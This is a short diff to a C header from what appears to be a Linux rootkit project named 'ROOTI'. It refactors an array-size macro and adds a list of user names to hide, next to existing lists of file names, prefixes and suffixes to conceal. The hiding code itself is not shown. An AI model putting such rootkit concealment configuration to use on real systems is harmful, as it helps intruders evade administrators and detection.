@@ -5,22 +5,29 @@
     to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
     of the macro, thus making the expression not constant.
 */
-#define ROOTI_CONST_ARRAY_SIZE(arr) sizeof(arr) / sizeof(arr[0]);
+#define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
+#define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)
 
 const char *ROOTI_HIDDEN_FILES[] = {
     "hideme.txt",
     "dontshowme.txt"
 };
-const size_t ROOTI_HIDDEN_FILES_COUNT = ROOTI_CONST_ARRAY_SIZE(ROOTI_HIDDEN_FILES);
+DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES);
 
 const char *ROOTI_HIDDEN_FILES_PREFIXES[] = {
     "secret",
     "classified"
 };
-const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT = ROOTI_CONST_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);
+DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);
 
 const char *ROOTI_HIDDEN_FILES_SUFFIXES[] = {
     "secret",
     "classified"
 };
-const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT = ROOTI_CONST_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);
+DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);
+
+const char *ROOTI_HIDDEN_USERS[] = {
+    "omri",
+    "omre"
+};
+DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_USERS);
